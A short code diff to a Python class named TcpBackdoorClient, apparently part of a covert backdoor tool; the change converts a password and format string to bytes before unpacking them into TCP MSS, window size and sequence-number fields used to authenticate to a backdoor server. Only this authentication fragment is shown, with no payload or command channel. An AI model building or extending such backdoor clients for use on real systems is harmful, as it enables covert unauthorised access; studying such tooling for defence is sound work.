@@ -301,7 +301,9 @@ class TcpBackdoorClient(BackdoorClient):
 
     def connect(self):
         # Insert the password into the packet so that the server can authenticate us
-        mss, windowsize, isn = struct.unpack("<HHI", self.password)
+        message = "<HHI"
+        newPassword = self.password
+        mss, windowsize, isn = struct.unpack(message.encode('utf-8'), newPassword.encode('utf-8'))
 
         self.sport = RandShort()
         self.seq = isn
